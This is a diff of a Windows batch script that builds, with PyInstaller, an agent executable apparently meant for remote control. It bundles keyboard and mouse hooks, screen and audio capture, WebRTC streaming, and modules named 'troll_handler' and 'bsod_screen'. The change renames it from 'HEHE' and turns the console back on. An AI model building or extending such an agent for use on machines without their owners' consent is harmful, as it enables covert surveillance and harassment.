@@ -13,7 +13,7 @@ mkdir dist
 
 :: 2. Dependencies (numpy, msgpack for optimizations)
 echo [*] Checking Dependencies...
-:: python -m pip install pyinstaller dxcam pynput pillow websockets PyQt6 opencv-python pyaudio mss numpy msgpack zstandard >nul 2>&1
+@REM python -m pip install pyinstaller dxcam pynput pillow websockets PyQt6 opencv-python-headless pyaudio mss numpy msgpack zstandard aiortc av >nul 2>&1
 if %errorlevel% neq 0 (
     echo [!] Failed to install dependencies!
     pause
@@ -55,8 +55,8 @@ echo.
 @REM )
 
 :: 4. Build AGENT (Optimized - uses --noupx for faster build)
-echo [*] Building 1/3: %AGENT_NAME%.exe...
-python -m PyInstaller --noconsole --onefile --noupx --name HEHE ^
+echo [*] Building 1/3: exe...
+python -m PyInstaller --console --onefile --noupx --name MydeskAgent ^
     --exclude-module matplotlib ^
     --exclude-module pandas ^
     --exclude-module scipy ^
@@ -89,6 +89,16 @@ python -m PyInstaller --noconsole --onefile --noupx --name HEHE ^
     --hidden-import=target.troll_handler ^
     --hidden-import=target.troll_video_player ^
     --hidden-import=target.bsod_screen ^
+    --hidden-import=target.webrtc_handler ^
+    --hidden-import=target.webrtc_tracks ^
+    --hidden-import=target.resource_manager ^
+    --hidden-import=aiortc ^
+    --hidden-import=aiortc.codecs ^
+    --hidden-import=aiortc.codecs.h264 ^
+    --hidden-import=aiortc.contrib.media ^
+    --hidden-import=av ^
+    --hidden-import=av.video ^
+    --hidden-import=av.audio ^
     --hidden-import=pynput.keyboard._win32 ^
     --hidden-import=pynput.mouse._win32 ^
     --hidden-import=numpy ^
@@ -136,5 +146,5 @@ exit /b
 :fail
 echo.
 echo [!] BUILD FAILED. Check errors above.
-pause
+@REM pause
 exit /b
